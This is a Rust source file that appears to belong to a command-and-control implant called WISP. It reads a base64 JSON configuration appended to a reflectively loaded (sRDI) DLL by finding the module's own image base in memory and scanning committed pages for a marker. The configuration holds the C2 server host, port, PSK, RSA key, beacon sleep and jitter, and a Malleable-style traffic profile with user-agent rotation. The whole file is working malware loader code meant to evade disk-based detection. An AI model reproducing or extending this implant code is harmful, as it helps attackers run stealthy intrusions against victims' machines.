// overlay.rs — read the config overlay appended to the DLL when loaded
// reflectively (sRDI) / from memory. This is how the server's stage2 config
// (server_host/port/psk/rsa key) reaches the agent without a conf file.
//
// The packer appends: [DLL bytes][\x00\x00WISPCFG\x00\x00][base64 JSON].
// srdi_stub.c copies the trailing bytes (past SizeOfImage) to base+SizeOfImage,
// so we locate our own image base (via a code anchor) and scan from there.
//
// IMPORTANT: memory outside the committed image must never be dereferenced
// blindly. We use VirtualQuery to walk only committed regions within a bounded
// window, so a reflective load (which maps only the image + overlay) cannot
// fault on unmapped memory.

use crate::agent::AgentConfig;

pub const OVERLAY_MARKER: &[u8] = b"\x00\x00WISPCFG\x00\x00";

/// Locate this module's image base by scanning backwards from a known in-image
/// address for the MZ/PE signature. Walks page-by-page downward, using
/// VirtualQuery to skip uncommitted gaps.
#[cfg(target_os = "windows")]
fn find_image_base(anchor: *const u8) -> usize {
    use windows_sys::Win32::System::Memory::{VirtualQuery, MEMORY_BASIC_INFORMATION, MEM_COMMIT};

    let addr = anchor as usize;
    if addr == 0 {
        return 0;
    }
    let low = addr.saturating_sub(4usize << 20); // look back up to 4 MB
    let mut p = (addr / 0x1000) * 0x1000;
    // Our reflective image is committed as one/many regions; within 4 MB below
    // the anchor it is safe to read page by page. (The image base must be
    // reachable: anchor is inside SizeOfImage, so base ≥ anchor - SizeOfImage
    // and SizeOfImage < 4 MB for typical agents.)
    while p >= low && p != 0 {
        // Probe for MZ/PE
        let magic = unsafe { *(p as *const u16) };
        if magic == 0x5A4D {
            let lfanew = unsafe { *(p.wrapping_add(0x3C) as *const i32) };
            if lfanew > 0 && lfanew <= 0x400 {
                let nt = p.wrapping_add(lfanew as usize);
                let pe_sig = unsafe { *(nt as *const u32) };
                if pe_sig == 0x00004550 {
                    let opt_magic = unsafe { *(nt.wrapping_add(4 + 16) as *const u16) };
                    if opt_magic == 0x20B {
                        let soi = unsafe { *(nt.wrapping_add(4 + 20 + 56) as *const u32) } as usize;
                        if soi > 0 && addr >= p && addr < p.wrapping_add(soi) {
                            return p;
                        }
                    }
                }
            }
        }
        if p < 0x1000 {
            return 0;
        }
        p -= 0x1000;
    }
    0
}

/// Anchor function: its address lies inside this module's image.
#[cfg(target_os = "windows")]
fn anchor() -> *const u8 {
    fn inner() -> usize {
        inner as usize
    }
    inner() as *const u8
}

/// Scan committed memory starting at `start` for the marker, walking at most
/// `max` bytes. Uses VirtualQuery to skip gaps so we never read unmapped pages.
#[cfg(target_os = "windows")]
fn scan_committed_for_marker(start: usize, max: usize) -> Option<(usize, usize)> {
    use windows_sys::Win32::System::Memory::{VirtualQuery, MEMORY_BASIC_INFORMATION, MEM_COMMIT};

    let mut cur = start;
    let end = start.saturating_add(max);
    while cur < end {
        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
        let len = unsafe {
            VirtualQuery(cur as *const core::ffi::c_void, &mut mbi, std::mem::size_of::<MEMORY_BASIC_INFORMATION>())
        };
        if len == 0 {
            break;
        }
        let region_start = mbi.BaseAddress as usize;
        let region_size = mbi.RegionSize;
        if region_size == 0 {
            break;
        }
        let region_end = region_start.saturating_add(region_size);

        if mbi.State == MEM_COMMIT {
            let scan_from = cur.max(region_start);
            let scan_to = region_end.min(end);
            if scan_from < scan_to {
                let region = unsafe { std::slice::from_raw_parts(scan_from as *const u8, scan_to - scan_from) };
                if let Some(pos) = find_marker(region) {
                    let marker_at = scan_from + pos;
                    // Return marker offset and the max contiguous bytes after it.
                    let after = scan_to - marker_at - OVERLAY_MARKER.len();
                    return Some((marker_at, after));
                }
            }
        }
        // Move to next region
        cur = region_end.max(cur + 1);
    }
    None
}

#[cfg(target_os = "windows")]
fn find_marker(region: &[u8]) -> Option<usize> {
    if region.len() < OVERLAY_MARKER.len() {
        return None;
    }
    // Last occurrence wins: the genuine overlay marker is the one appended at
    // the very end of the DLL (accidental matches may appear earlier in .rdata).
    region
        .windows(OVERLAY_MARKER.len())
        .rposition(|w| w == OVERLAY_MARKER)
}

/// Locate the overlay and return the base64 config bytes after the marker.
/// We scan FORWARD (higher addresses) from a code anchor: sRDI copies the
/// overlay to base+SizeOfImage which is above the code section. Uses
/// VirtualQuery so only committed pages are read.
#[cfg(target_os = "windows")]
pub fn load_overlay() -> Option<String> {
    let (marker_at, after) = scan_forward_for_marker(anchor(), 8usize << 20)?;

    let cfg_start = marker_at + OVERLAY_MARKER.len();
    let cfg_slice = unsafe { std::slice::from_raw_parts(cfg_start as *const u8, after.min(4096)) };
    let mut end = 0;
    for (i, &b) in cfg_slice.iter().enumerate() {
        if b == 0 || b == b'\n' || b == b'\r' {
            break;
        }
        end = i + 1;
    }
    if end == 0 {
        return None;
    }
    Some(String::from_utf8_lossy(&cfg_slice[..end]).into_owned())
}

/// Scan forward from `start` across committed regions (up to `max` bytes) for
/// the overlay marker. Returns (marker_addr, bytes_after_within_region).
#[cfg(target_os = "windows")]
fn scan_forward_for_marker(start: *const u8, max: usize) -> Option<(usize, usize)> {
    use windows_sys::Win32::System::Memory::{VirtualQuery, MEMORY_BASIC_INFORMATION, MEM_COMMIT};

    let begin = start as usize;
    let limit = begin.saturating_add(max);
    let mut cur = begin;
    let mut best: Option<(usize, usize)> = None;
    while cur < limit {
        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
        let len = unsafe {
            VirtualQuery(cur as *const core::ffi::c_void, &mut mbi, std::mem::size_of::<MEMORY_BASIC_INFORMATION>())
        };
        if len == 0 {
            break;
        }
        let rstart = mbi.BaseAddress as usize;
        let rsize = mbi.RegionSize;
        if rsize == 0 {
            break;
        }
        let rend = rstart.saturating_add(rsize);

        if mbi.State == MEM_COMMIT {
            let s = cur.max(rstart);
            let e = rend.min(limit);
            if s < e {
                let region = unsafe { std::slice::from_raw_parts(s as *const u8, e - s) };
                if let Some(pos) = find_marker(region) {
                    let marker_at = s + pos;
                    let after = (e - marker_at).saturating_sub(OVERLAY_MARKER.len());
                    if best.map_or(true, |(ba, _)| marker_at > ba) {
                        best = Some((marker_at, after));
                    }
                }
            }
        }
        cur = rend.max(cur + 1);
        if cur <= begin {
            break;
        }
    }
    best
}

#[cfg(not(target_os = "windows"))]
pub fn load_overlay() -> Option<String> {
    None
}

/// Build an AgentConfig from an overlay base64 JSON (Go payloadAgentConfig).
pub fn config_from_overlay_json(b64json: &str) -> Option<AgentConfig> {
    use base64::engine::general_purpose::STANDARD as B64;
    use base64::Engine;

    let json = B64.decode(b64json.trim()).ok()?;
    let v: serde_json::Value = serde_json::from_slice(&json).ok()?;

    let host = v["server_host"].as_str()?.to_string();
    let port = v["server_port"].as_u64()? as u16;
    let rsa = v["rsa_public_key"].as_str()?.to_string();
    let psk = v["psk"].as_str().unwrap_or("").to_string();
    let sleep = v["sleep"].as_u64().unwrap_or(5000);
    let jitter = v["jitter"].as_u64().unwrap_or(0);

    // Parse the Malleable traffic profile (custom URIs / UA rotation).
    let tp = v.get("traffic_profile").and_then(|t| {
        let mut p = crate::agent::TrafficProfile::default();
        if let Some(uas) = t["user_agents"].as_array() {
            p.user_agents = uas.iter().filter_map(|u| u.as_str().map(String::from)).collect();
        }
        if let Some(uris) = t["uris"].as_array() {
            p.uris = uris.iter().filter_map(|u| u.as_str().map(String::from)).collect();
        }
        p.register_uri = t["register_uri"].as_str().unwrap_or("").to_string();
        p.checkin_uri = t["checkin_uri"].as_str().unwrap_or("").to_string();
        p.pubkey_uri = t["pubkey_uri"].as_str().unwrap_or("").to_string();
        Some(p)
    });

    Some(AgentConfig {
        server_host: host,
        server_port: port,
        rsa_pub_pem: rsa,
        psk,
        sleep_ms: sleep,
        jitter,
        transport: "http".to_string(),
            scheme: "http".to_string(),
        traffic_profile: tp,
    })
}

/// Try the overlay first (reflective load), fall back to env/conf/defaults.
pub fn load_with_overlay() -> AgentConfig {
    // env/conf takes precedence if fully specified (field testing).
    if let Ok(v) = std::env::var("WISP_RSA_PUB") {
        if !v.is_empty() {
            return AgentConfig::from_env();
        }
    }
    if let Some(overlay) = load_overlay() {
        if let Some(cfg) = config_from_overlay_json(&overlay) {
            return cfg;
        }
    }
    AgentConfig::from_env()
}
